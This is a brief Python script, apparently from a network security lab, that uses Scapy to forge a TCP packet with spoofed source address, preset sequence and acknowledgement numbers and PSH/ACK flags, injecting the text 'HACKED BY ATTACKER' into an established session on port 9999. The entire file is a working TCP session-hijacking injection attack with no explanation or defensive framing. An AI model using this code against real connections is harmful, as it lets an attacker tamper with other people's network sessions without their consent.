from scapy.all import *

ip = IP(src="192.168.43.95", dst="192.168.43.8")

tcp = TCP(sport=35120, dport=9999, flags="PA",seq=3669432996, ack=1165093160) 
payload = "HACKED BY ATTACKER \n"

pkt = ip/tcp/payload
send(pkt, verbose=1)